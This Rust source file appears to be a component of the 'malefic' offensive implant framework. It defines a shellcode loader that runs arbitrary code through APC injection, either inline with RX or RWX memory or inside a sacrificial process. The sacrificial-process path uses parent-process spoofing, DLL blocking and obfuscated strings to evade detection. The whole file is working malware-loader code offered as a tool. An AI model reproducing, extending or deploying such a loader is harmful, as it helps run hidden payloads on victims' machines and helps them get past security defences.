use malefic_gateway::obfstr;
use malefic_os_win::kit::binding::{ApcLoaderInline, ApcLoaderSacriface};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u32)]
pub enum LoaderType {
    InlineRX = 1,
    InlineRWX = 2,
}

impl LoaderType {
    pub fn from_str(s: &str) -> Self {
        match s {
            "2" | "rwx" | "inline_rwx" => LoaderType::InlineRWX,
            _ => LoaderType::InlineRX,
        }
    }

    pub fn from_u32(n: u32) -> Self {
        match n {
            2 => LoaderType::InlineRWX,
            _ => LoaderType::InlineRX,
        }
    }
}

pub unsafe fn loader(
    bin: Vec<u8>,
    is_need_sacrifice: bool,
    sacrifice_commandline: *mut i8,
    ppid: u32,
    block_dll: bool,
    need_output: bool,
    loader_type: u32,
) -> Result<Vec<u8>, String> {
    if bin.is_empty() {
        return Err(obfstr!("empty shellcode").to_string());
    }
    if is_need_sacrifice {
        let ret = ApcLoaderSacriface(
            bin.as_ptr(),
            bin.len(),
            sacrifice_commandline,
            ppid,
            block_dll,
            need_output,
        );
        return Ok(ret.into_bytes());
    }
    let ret = ApcLoaderInline(bin.as_ptr(), bin.len(), need_output, loader_type);
    Ok(ret.into_bytes())
}
